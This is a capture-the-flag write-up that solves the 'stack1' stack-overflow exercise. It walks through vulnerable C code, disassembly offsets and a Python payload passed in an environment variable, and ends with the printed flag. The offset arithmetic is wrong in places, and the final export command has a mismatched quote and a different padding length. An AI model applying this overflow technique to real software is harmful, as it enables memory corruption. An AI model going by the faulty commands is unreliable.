# stack1
###### Writeup by Tim Winters

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;
  FILE *fp;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;
  strcpy(buffer, variable);
  fp  = fopen("./flag.txt", "r");

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
      fgets(buffer, 64, (FILE*)fp);
      printf("flag: %s\n", buffer );
      exit(0);
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
```
stack1 one is very similar to stack0. We have a variable `modified` that is set to 0, but is checked against a non-zero value. 

Examining the code we see a call to `strcpy` thaat writes the value of environment variable `GREENIE` into `buffer`. We will use this unchecked call to exploit the code.

Let's start by determining the addresses of our variables.

```asm
...
   0x080485c1 <+70>:	push   DWORD PTR [ebp-0xc]
   0x080485c4 <+73>:	lea    eax,[ebp-0x54]
   0x080485c7 <+76>:	push   eax
   0x080485c8 <+77>:	call   0x8048400 <strcpy@plt>
...   
```
Here we have the instructions that set up the stack for the call to `strcpy`. x86 conventions say that the arguments are put on the stack in reverse order. Therefore, `ebp-0x54` is the address of `buffer`. 

Later on we see 

```asm
0x080485e8 <+109>:	mov    eax,DWORD PTR [ebp-0x14]
0x080485eb <+112>:	cmp    eax,0xd0a0d0a
```
This comparison matches up with the comparison of `modified` in the source code. `ebp-0x14` is the address of our modified variable. 

`0x54 - 0x14` = `0x64`. We need 64 bytes of data before we start overwriting our variable. 

To properly write the value of `0xd0a0d0a` it is not enough to simple have our input be `"...aad0a0d0a"`. This will not write the raw bytes, but rather the ascii bytes of the characters. Instead, we can use python to create these literals. 

```
> python -c "import struct; print 'a'*64 + struct.pack('I', 0xd0a0d0a)"
```

It is not enough to simply pass this into `stdin`. Looking at the source code, it pulls our overflowing text from the `GREENIE` environment variable. To set it 

``export GREENIE=`python -c "import struct; print 'a'*65 + struct.pack('I", 0xd0a0d0a)"` ``

Then run the executable normally

```
> ./stack1
you have correctly modified the variable
flag: adec00ee873ae277be6a5548188d80d6
```